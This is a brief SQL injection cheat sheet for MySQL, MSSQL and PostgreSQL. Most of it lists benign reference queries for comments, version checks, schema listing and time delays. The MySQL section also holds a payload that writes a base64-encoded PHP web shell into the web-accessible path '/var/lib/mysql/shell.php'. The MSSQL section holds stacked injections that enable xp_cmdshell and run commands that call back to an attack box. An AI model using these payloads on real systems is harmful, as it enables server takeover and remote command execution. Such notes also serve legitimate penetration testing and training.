# Cheat Sheet Highlights

## Language

### MySQL

```mysql
/* Comments */
#comment
-- comment
/*comment*/

/* Database version */
SELECT @@version

/* Database contents */
SELECT * FROM information_schema.tables
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'

/* Time delays */
SELECT SLEEP(5)

/* Write file */
'; select from_base64("PD9waHAKc3lzdGVtKCRfR0VUWydjbWQnXSk7Cj8+Cg==") into dumpfile '/var/lib/mysql/shell.php'--+
```

### MSSQL

```sql
/* Comments */
--comment
/*comment*/

/* Database version */
SELECT @@version

/* Database contents */
SELECT * FROM information_schema.tables
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'

/* Time delays */
WAITFOR DELAY '0:0:5'
```

#### Test code execution

```
'; EXECUTE sp_configure 'show advanced options', 1;--
'; RECONFIGURE;--
'; EXECUTE sp_configure 'xp_cmdshell', 1;--
'; RECONFIGURE;--
```

On attack box

```bash
sudo tcpdump -i tun0 icmp
```

Back to target

```
'; EXECUTE xp_cmdshell 'ping <ATTACK_BOX>';--
```

### PostgreSQL

```postgresql
/* Comments */
--comment
/*comment*/

/* Database version */
SELECT version()

/* Database contents */
SELECT * FROM information_schema.tables
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'

/* Time delays */
SELECT pg_sleep(5)
```
